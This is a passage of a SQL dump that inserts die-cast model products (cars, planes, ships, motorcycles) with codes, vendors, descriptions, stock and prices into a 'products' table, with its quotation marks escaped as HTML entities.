\u0026#39;1:18\u0026#39;, \u0026#39;Studio M Art Models\u0026#39;, \u0026#39;This model features soft rubber tires, working steering, rubber mud guards, authentic Ford logos, detailed undercarriage, opening doors and hood, removable split rear gate, full size spare mounted in bed, detailed interior with opening glove box\u0026#39;, \u0026#39;2613\u0026#39;, \u0026#39;58.33\u0026#39;, \u0026#39;116.67\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_1129\u0026#39;, \u0026#39;1993 Mazda RX-7\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Highway 66 Mini Classics\u0026#39;, \u0026#39;This model features, opening hood, opening doors, detailed engine, rear spoiler, opening trunk, working steering, tinted windows, baked enamel finish. Color red.\u0026#39;, \u0026#39;3975\u0026#39;, \u0026#39;83.51\u0026#39;, \u0026#39;141.54\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_1342\u0026#39;, \u0026#39;1937 Lincoln Berline\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Motor City Art Classics\u0026#39;, \u0026#39;Features opening engine cover, doors, trunk, and fuel filler cap. Color black\u0026#39;, \u0026#39;8693\u0026#39;, \u0026#39;60.62\u0026#39;, \u0026#39;102.74\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_1367\u0026#39;, \u0026#39;1936 Mercedes-Benz 500K Special Roadster\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Studio M Art Models\u0026#39;, \u0026#39;This 1:18 scale replica is constructed of heavy die-cast metal and has all the features of the original: working doors and rumble seat, independent spring suspension, detailed interior, working steering system, and a bifold hood that reveals an engine so accurate that it even includes the wiring. All this is topped off with a baked enamel finish. Color white.\u0026#39;, \u0026#39;8635\u0026#39;, \u0026#39;24.26\u0026#39;, \u0026#39;53.91\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_1589\u0026#39;, \u0026#39;1965 Aston Martin DB5\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;Die-cast model of the silver 1965 Aston Martin DB5 in silver. This model includes full wire wheels and doors that open with fully detailed passenger compartment. In 1:18 scale, this model measures approximately 10 inches/20 cm long.\u0026#39;, \u0026#39;9042\u0026#39;, \u0026#39;65.96\u0026#39;, \u0026#39;124.44\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_1662\u0026#39;, \u0026#39;1980s Black Hawk Helicopter\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Red Start Diecast\u0026#39;, \u0026#39;1:18 scale replica of actual Army\\\u0026#39;s UH-60L BLACK HAWK Helicopter. 100% hand-assembled. Features rotating rotor blades, propeller blades and rubber wheels.\u0026#39;, \u0026#39;5330\u0026#39;, \u0026#39;77.27\u0026#39;, \u0026#39;157.69\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_1749\u0026#39;, \u0026#39;1917 Grand Touring Sedan\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Welly Diecast Productions\u0026#39;, \u0026#39;This 1:18 scale replica of the 1917 Grand Touring car has all the features you would expect from museum quality reproductions: all four doors and bi-fold hood opening, detailed engine and instrument panel, chrome-look trim, and tufted upholstery, all topped off with a factory baked-enamel finish.\u0026#39;, \u0026#39;2724\u0026#39;, \u0026#39;86.70\u0026#39;, \u0026#39;170.00\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_1889\u0026#39;, \u0026#39;1948 Porsche 356-A Roadster\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Gearbox Collectibles\u0026#39;, \u0026#39;This precision die-cast replica features opening doors, superb detail and craftsmanship, working steering system, opening forward compartment, opening rear trunk with removable spare, 4 wheel independent spring suspension as well as factory baked enamel finish.\u0026#39;, \u0026#39;8826\u0026#39;, \u0026#39;53.90\u0026#39;, \u0026#39;77.00\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_1984\u0026#39;, \u0026#39;1995 Honda Civic\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Min Lin Diecast\u0026#39;, \u0026#39;This model features, opening hood, opening doors, detailed engine, rear spoiler, opening trunk, working steering, tinted windows, baked enamel finish. Color yellow.\u0026#39;, \u0026#39;9772\u0026#39;, \u0026#39;93.89\u0026#39;, \u0026#39;142.25\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2238\u0026#39;, \u0026#39;1998 Chrysler Plymouth Prowler\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Gearbox Collectibles\u0026#39;, \u0026#39;Turnable front wheels; steering function; detailed interior; detailed engine; opening hood; opening trunk; opening doors; and detailed chassis.\u0026#39;, \u0026#39;4724\u0026#39;, \u0026#39;101.51\u0026#39;, \u0026#39;163.73\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2248\u0026#39;, \u0026#39;1911 Ford Town Car\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Motor City Art Classics\u0026#39;, \u0026#39;Features opening hood, opening doors, opening trunk, wide white wall tires, front door arm rests, working steering system.\u0026#39;, \u0026#39;540\u0026#39;, \u0026#39;33.30\u0026#39;, \u0026#39;60.54\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2319\u0026#39;, \u0026#39;1964 Mercedes Tour Bus\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Unimax Art Galleries\u0026#39;, \u0026#39;Exact replica. 100+ parts. working steering system, original logos\u0026#39;, \u0026#39;8258\u0026#39;, \u0026#39;74.86\u0026#39;, \u0026#39;122.73\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2325\u0026#39;, \u0026#39;1932 Model A Ford J-Coupe\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Autoart Studio Design\u0026#39;, \u0026#39;This model features grille-mounted chrome horn, lift-up louvered hood, fold-down rumble seat, working steering system, chrome-covered spare, opening doors, detailed and wired engine\u0026#39;, \u0026#39;9354\u0026#39;, \u0026#39;58.48\u0026#39;, \u0026#39;127.13\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2432\u0026#39;, \u0026#39;1926 Ford Fire Engine\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Carousel DieCast Legends\u0026#39;, \u0026#39;Gleaming red handsome appearance. Everything is here the fire hoses, ladder, axes, bells, lanterns, ready to fight any inferno.\u0026#39;, \u0026#39;2018\u0026#39;, \u0026#39;24.92\u0026#39;, \u0026#39;60.77\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2581\u0026#39;, \u0026#39;P-51-D Mustang\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:72\u0026#39;, \u0026#39;Gearbox Collectibles\u0026#39;, \u0026#39;Has retractable wheels and comes with a stand\u0026#39;, \u0026#39;992\u0026#39;, \u0026#39;49.00\u0026#39;, \u0026#39;84.48\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2625\u0026#39;, \u0026#39;1936 Harley Davidson El Knucklehead\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Welly Diecast Productions\u0026#39;, \u0026#39;Intricately detailed with chrome accents and trim, official die-struck logos and baked enamel finish.\u0026#39;, \u0026#39;4357\u0026#39;, \u0026#39;24.23\u0026#39;, \u0026#39;60.57\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2795\u0026#39;, \u0026#39;1928 Mercedes-Benz SSK\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Gearbox Collectibles\u0026#39;, \u0026#39;This 1:18 replica features grille-mounted chrome horn, lift-up louvered hood, fold-down rumble seat, working steering system, chrome-covered spare, opening doors, detailed and wired engine. Color black.\u0026#39;, \u0026#39;548\u0026#39;, \u0026#39;72.56\u0026#39;, \u0026#39;168.75\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2870\u0026#39;, \u0026#39;1999 Indy 500 Monte Carlo SS\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Red Start Diecast\u0026#39;, \u0026#39;Features include opening and closing doors. Color: Red\u0026#39;, \u0026#39;8164\u0026#39;, \u0026#39;56.76\u0026#39;, \u0026#39;132.00\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2949\u0026#39;, \u0026#39;1913 Ford Model T Speedster\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Carousel DieCast Legends\u0026#39;, \u0026#39;This 250 part reproduction includes moving handbrakes, clutch, throttle and foot pedals, squeezable horn, detailed wired engine, removable water, gas, and oil cans, pivoting monocle windshield, all topped with a baked enamel red finish. Each replica comes with an Owners Title and Certificate of Authenticity. Color red.\u0026#39;, \u0026#39;4189\u0026#39;, \u0026#39;60.78\u0026#39;, \u0026#39;101.31\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_2957\u0026#39;, \u0026#39;1934 Ford V8 Coupe\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Min Lin Diecast\u0026#39;, \u0026#39;Chrome Trim, Chrome Grille, Opening Hood, Opening Doors, Opening Trunk, Detailed Engine, Working Steering System\u0026#39;, \u0026#39;5649\u0026#39;, \u0026#39;34.35\u0026#39;, \u0026#39;62.46\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3029\u0026#39;, \u0026#39;1999 Yamaha Speed Boat\u0026#39;, \u0026#39;Ships\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Min Lin Diecast\u0026#39;, \u0026#39;Exact replica. Wood and Metal. Many extras including rigging, long boats, pilot house, anchors, etc. Comes with three masts, all square-rigged.\u0026#39;, \u0026#39;4259\u0026#39;, \u0026#39;51.61\u0026#39;, \u0026#39;86.02\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3136\u0026#39;, \u0026#39;18th Century Vintage Horse Carriage\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Red Start Diecast\u0026#39;, \u0026#39;Hand crafted diecast-like metal horse carriage is re-created in about 1:18 scale of antique horse carriage. This antique style metal Stagecoach is all hand-assembled with many different parts.\\r\\n\\r\\nThis collectible metal horse carriage is painted in classic Red, and features turning steering wheel and is entirely hand-finished.\u0026#39;, \u0026#39;5992\u0026#39;, \u0026#39;60.74\u0026#39;, \u0026#39;104.72\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3140\u0026#39;, \u0026#39;1903 Ford Model A\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Unimax Art Galleries\u0026#39;, \u0026#39;Features opening trunk, working steering system\u0026#39;, \u0026#39;3913\u0026#39;, \u0026#39;68.30\u0026#39;, \u0026#39;136.59\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3232\u0026#39;, \u0026#39;1992 Ferrari 360 Spider red\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Unimax Art Galleries\u0026#39;, \u0026#39;his replica features opening doors, superb detail and craftsmanship, working steering system, opening forward compartment, opening rear trunk with removable spare, 4 wheel independent spring suspension as well as factory baked enamel finish.\u0026#39;, \u0026#39;8347\u0026#39;, \u0026#39;77.90\u0026#39;, \u0026#39;169.34\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3233\u0026#39;, \u0026#39;1985 Toyota Supra\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Highway 66 Mini Classics\u0026#39;, \u0026#39;This model features soft rubber tires, working steering, rubber mud guards, authentic Ford logos, detailed undercarriage, opening doors and hood, removable split rear gate, full size spare mounted in bed, detailed interior with opening glove box\u0026#39;, \u0026#39;7733\u0026#39;, \u0026#39;57.01\u0026#39;, \u0026#39;107.57\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3259\u0026#39;, \u0026#39;Collectable Wooden Train\u0026#39;, \u0026#39;Trains\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Carousel DieCast Legends\u0026#39;, \u0026#39;Hand crafted wooden toy train set is in about 1:18 scale, 25 inches in total length including 2 additional carts, of actual vintage train. This antique style wooden toy train model set is all hand-assembled with 100% wood.\u0026#39;, \u0026#39;6450\u0026#39;, \u0026#39;67.56\u0026#39;, \u0026#39;100.84\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3278\u0026#39;, \u0026#39;1969 Dodge Super Bee\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Min Lin Diecast\u0026#39;, \u0026#39;This replica features opening doors, superb detail and craftsmanship, working steering system, opening forward compartment, opening rear trunk with removable spare, 4 wheel independent spring suspension as well as factory baked enamel finish.\u0026#39;, \u0026#39;1917\u0026#39;, \u0026#39;49.05\u0026#39;, \u0026#39;80.41\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3320\u0026#39;, \u0026#39;1917 Maxwell Touring Car\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Exoto Designs\u0026#39;, \u0026#39;Features Gold Trim, Full Size Spare Tire, Chrome Trim, Chrome Grille, Opening Hood, Opening Doors, Opening Trunk, Detailed Engine, Working Steering System\u0026#39;, \u0026#39;7913\u0026#39;, \u0026#39;57.54\u0026#39;, \u0026#39;99.21\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3482\u0026#39;, \u0026#39;1976 Ford Gran Torino\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Gearbox Collectibles\u0026#39;, \u0026#39;Highly detailed 1976 Ford Gran Torino \\\u0026#34;Starsky and Hutch\\\u0026#34; diecast model. Very well constructed and painted in red and white patterns.\u0026#39;, \u0026#39;9127\u0026#39;, \u0026#39;73.49\u0026#39;, \u0026#39;146.99\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3685\u0026#39;, \u0026#39;1948 Porsche Type 356 Roadster\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Gearbox Collectibles\u0026#39;, \u0026#39;This model features working front and rear suspension on accurately replicated and actuating shock absorbers as well as opening engine cover, rear stabilizer flap, and 4 opening doors.\u0026#39;, \u0026#39;8990\u0026#39;, \u0026#39;62.16\u0026#39;, \u0026#39;141.28\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3782\u0026#39;, \u0026#39;1957 Vespa GS150\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Studio M Art Models\u0026#39;, \u0026#39;Features rotating wheels , working kick stand. Comes with stand.\u0026#39;, \u0026#39;7689\u0026#39;, \u0026#39;32.95\u0026#39;, \u0026#39;62.17\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_3856\u0026#39;, \u0026#39;1941 Chevrolet Special Deluxe Cabriolet\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Exoto Designs\u0026#39;, \u0026#39;Features opening hood, opening doors, opening trunk, wide white wall tires, front door arm rests, working steering system, leather upholstery. Color black.\u0026#39;, \u0026#39;2378\u0026#39;, \u0026#39;64.58\u0026#39;, \u0026#39;105.87\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_4027\u0026#39;, \u0026#39;1970 Triumph Spitfire\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Min Lin Diecast\u0026#39;, \u0026#39;Features include opening and closing doors. Color: White.\u0026#39;, \u0026#39;5545\u0026#39;, \u0026#39;91.92\u0026#39;, \u0026#39;143.62\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_4409\u0026#39;, \u0026#39;1932 Alfa Romeo 8C2300 Spider Sport\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Exoto Designs\u0026#39;, \u0026#39;This 1:18 scale precision die cast replica features the 6 front headlights of the original, plus a detailed version of the 142 horsepower straight 8 engine, dual spares and their famous comprehensive dashboard. Color black.\u0026#39;, \u0026#39;6553\u0026#39;, \u0026#39;43.26\u0026#39;, \u0026#39;92.03\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_4522\u0026#39;, \u0026#39;1904 Buick Runabout\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Exoto Designs\u0026#39;, \u0026#39;Features opening trunk, working steering system\u0026#39;, \u0026#39;8290\u0026#39;, \u0026#39;52.66\u0026#39;, \u0026#39;87.77\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_4600\u0026#39;, \u0026#39;1940s Ford truck\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Motor City Art Classics\u0026#39;, \u0026#39;This 1940s Ford Pick-Up truck is re-created in 1:18 scale of original 1940s Ford truck. This antique style metal 1940s Ford Flatbed truck is all hand-assembled. This collectible 1940\\\u0026#39;s Pick-Up truck is painted in classic dark green color, and features rotating wheels.\u0026#39;, \u0026#39;3128\u0026#39;, \u0026#39;84.76\u0026#39;, \u0026#39;121.08\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_4668\u0026#39;, \u0026#39;1939 Cadillac Limousine\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Studio M Art Models\u0026#39;, \u0026#39;Features completely detailed interior including Velvet flocked drapes,deluxe wood grain floor, and a wood grain casket with seperate chrome handles\u0026#39;, \u0026#39;6645\u0026#39;, \u0026#39;23.14\u0026#39;, \u0026#39;50.31\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_4721\u0026#39;, \u0026#39;1957 Corvette Convertible\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;1957 die cast Corvette Convertible in Roman Red with white sides and whitewall tires. 1:18 scale quality die-cast with detailed engine and underbvody. Now you can own The Classic Corvette.\u0026#39;, \u0026#39;1249\u0026#39;, \u0026#39;69.93\u0026#39;, \u0026#39;148.80\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_4933\u0026#39;, \u0026#39;1957 Ford Thunderbird\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Studio M Art Models\u0026#39;, \u0026#39;This 1:18 scale precision die-cast replica, with its optional porthole hardtop and factory baked-enamel Thunderbird Bronze finish, is a 100% accurate rendition of this American classic.\u0026#39;, \u0026#39;3209\u0026#39;, \u0026#39;34.21\u0026#39;, \u0026#39;71.27\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_1046\u0026#39;, \u0026#39;1970 Chevy Chevelle SS 454\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Unimax Art Galleries\u0026#39;, \u0026#39;This model features rotating wheels, working streering system and opening doors. All parts are particularly delicate due to their precise scale and require special care and attention. It should not be picked up by the doors, roof, hood or trunk.\u0026#39;, \u0026#39;1005\u0026#39;, \u0026#39;49.24\u0026#39;, \u0026#39;73.49\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_1444\u0026#39;, \u0026#39;1970 Dodge Coronet\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Highway 66 Mini Classics\u0026#39;, \u0026#39;1:24 scale die-cast about 18\\\u0026#34; long doors open, hood opens and rubber wheels\u0026#39;, \u0026#39;4074\u0026#39;, \u0026#39;32.37\u0026#39;, \u0026#39;57.80\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_1578\u0026#39;, \u0026#39;1997 BMW R 1100 S\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Autoart Studio Design\u0026#39;, \u0026#39;Detailed scale replica with working suspension and constructed from over 70 parts\u0026#39;, \u0026#39;7003\u0026#39;, \u0026#39;60.86\u0026#39;, \u0026#39;112.70\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_1628\u0026#39;, \u0026#39;1966 Shelby Cobra 427 S/C\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Carousel DieCast Legends\u0026#39;, \u0026#39;This diecast model of the 1966 Shelby Cobra 427 S/C includes many authentic details and operating parts. The 1:24 scale model of this iconic lighweight sports car from the 1960s comes in silver and it\\\u0026#39;s own display case.\u0026#39;, \u0026#39;8197\u0026#39;, \u0026#39;29.18\u0026#39;, \u0026#39;50.31\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_1785\u0026#39;, \u0026#39;1928 British Royal Navy Airplane\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;Official logos and insignias\u0026#39;, \u0026#39;3627\u0026#39;, \u0026#39;66.74\u0026#39;, \u0026#39;109.42\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_1937\u0026#39;, \u0026#39;1939 Chevrolet Deluxe Coupe\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Motor City Art Classics\u0026#39;, \u0026#39;This 1:24 scale die-cast replica of the 1939 Chevrolet Deluxe Coupe has the same classy look as the original. Features opening trunk, hood and doors and a showroom quality baked enamel finish.\u0026#39;, \u0026#39;7332\u0026#39;, \u0026#39;22.57\u0026#39;, \u0026#39;33.19\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2000\u0026#39;, \u0026#39;1960 BSA Gold Star DBD34\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Highway 66 Mini Classics\u0026#39;, \u0026#39;Detailed scale replica with working suspension and constructed from over 70 parts\u0026#39;, \u0026#39;15\u0026#39;, \u0026#39;37.32\u0026#39;, \u0026#39;76.17\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2011\u0026#39;, \u0026#39;18th century schooner\u0026#39;, \u0026#39;Ships\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Carousel DieCast Legends\u0026#39;, \u0026#39;All wood with canvas sails. Many extras including rigging, long boats, pilot house, anchors, etc. Comes with 4 masts, all square-rigged.\u0026#39;, \u0026#39;1898\u0026#39;, \u0026#39;82.34\u0026#39;, \u0026#39;122.89\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2022\u0026#39;, \u0026#39;1938 Cadillac V-16 Presidential Limousine\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;This 1:24 scale precision die cast replica of the 1938 Cadillac V-16 Presidential Limousine has all the details of the original, from the flags on the front to an opening back seat compartment complete with telephone and rifle. Features factory baked-enamel black finish, hood goddess ornament, working jump seats.\u0026#39;, \u0026#39;2847\u0026#39;, \u0026#39;20.61\u0026#39;, \u0026#39;44.80\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2300\u0026#39;, \u0026#39;1962 Volkswagen Microbus\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Autoart Studio Design\u0026#39;, \u0026#39;This 1:18 scale die cast replica of the 1962 Microbus is loaded with features: A working steering system, opening front doors and tailgate, and famous two-tone factory baked enamel finish, are all topped of by the sliding, real fabric, sunroof.\u0026#39;, \u0026#39;2327\u0026#39;, \u0026#39;61.34\u0026#39;, \u0026#39;127.79\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2360\u0026#39;, \u0026#39;1982 Ducati 900 Monster\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Highway 66 Mini Classics\u0026#39;, \u0026#39;Features two-tone paint with chrome accents, superior die-cast detail , rotating wheels , working kick stand\u0026#39;, \u0026#39;6840\u0026#39;, \u0026#39;47.10\u0026#39;, \u0026#39;69.26\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2766\u0026#39;, \u0026#39;1949 Jaguar XK 120\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;Precision-engineered from original Jaguar specification in perfect scale ratio. Features opening doors, superb detail and craftsmanship, working steering system, opening forward compartment, opening rear trunk with removable spare, 4 wheel independent spring suspension as well as factory baked enamel finish.\u0026#39;, \u0026#39;2350\u0026#39;, \u0026#39;47.25\u0026#39;, \u0026#39;90.87\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2840\u0026#39;, \u0026#39;1958 Chevy Corvette Limited Edition\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Carousel DieCast Legends\u0026#39;, \u0026#39;The operating parts of this 1958 Chevy Corvette Limited Edition are particularly delicate due to their precise scale and require special care and attention. Features rotating wheels, working streering, opening doors and trunk. Color dark green.\u0026#39;, \u0026#39;2542\u0026#39;, \u0026#39;15.91\u0026#39;, \u0026#39;35.36\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2841\u0026#39;, \u0026#39;1900s Vintage Bi-Plane\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Autoart Studio Design\u0026#39;, \u0026#39;Hand crafted diecast-like metal bi-plane is re-created in about 1:24 scale of antique pioneer airplane. All hand-assembled with many different parts. Hand-painted in classic yellow and features correct markings of original airplane.\u0026#39;, \u0026#39;5942\u0026#39;, \u0026#39;34.25\u0026#39;, \u0026#39;68.51\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2887\u0026#39;, \u0026#39;1952 Citroen-15CV\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Exoto Designs\u0026#39;, \u0026#39;Precision crafted hand-assembled 1:18 scale reproduction of the 1952 15CV, with its independent spring suspension, working steering system, opening doors and hood, detailed engine and instrument panel, all topped of with a factory fresh baked enamel finish.\u0026#39;, \u0026#39;1452\u0026#39;, \u0026#39;72.82\u0026#39;, \u0026#39;117.44\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_2972\u0026#39;, \u0026#39;1982 Lamborghini Diablo\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Second Gear Diecast\u0026#39;, \u0026#39;This replica features opening doors, superb detail and craftsmanship, working steering system, opening forward compartment, opening rear trunk with removable spare, 4 wheel independent spring suspension as well as factory baked enamel finish.\u0026#39;, \u0026#39;7723\u0026#39;, \u0026#39;16.24\u0026#39;, \u0026#39;37.76\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_3151\u0026#39;, \u0026#39;1912 Ford Model T Delivery Wagon\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Min Lin Diecast\u0026#39;, \u0026#39;This model features chrome trim and grille, opening hood, opening doors, opening trunk, detailed engine, working steering system. Color white.\u0026#39;, \u0026#39;9173\u0026#39;, \u0026#39;46.91\u0026#39;, \u0026#39;88.51\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_3191\u0026#39;, \u0026#39;1969 Chevrolet Camaro Z28\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Exoto Designs\u0026#39;, \u0026#39;1969 Z/28 Chevy Camaro 1:24 scale replica. The operating parts of this limited edition 1:24 scale diecast model car 1969 Chevy Camaro Z28- hood, trunk, wheels, streering, suspension and doors- are particularly delicate due to their precise scale and require special care and attention.\u0026#39;, \u0026#39;4695\u0026#39;, \u0026#39;50.51\u0026#39;, \u0026#39;85.61\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_3371\u0026#39;, \u0026#39;1971 Alpine Renault 1600s\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Welly Diecast Productions\u0026#39;, \u0026#39;This 1971 Alpine Renault 1600s replica Features opening doors, superb detail and craftsmanship, working steering system, opening forward compartment, opening rear trunk with removable spare, 4 wheel independent spring suspension as well as factory baked enamel finish.\u0026#39;, \u0026#39;7995\u0026#39;, \u0026#39;38.58\u0026#39;, \u0026#39;61.23\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_3420\u0026#39;, \u0026#39;1937 Horch 930V Limousine\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Autoart Studio Design\u0026#39;, \u0026#39;Features opening hood, opening doors, opening trunk, wide white wall tires, front door arm rests, working steering system\u0026#39;, 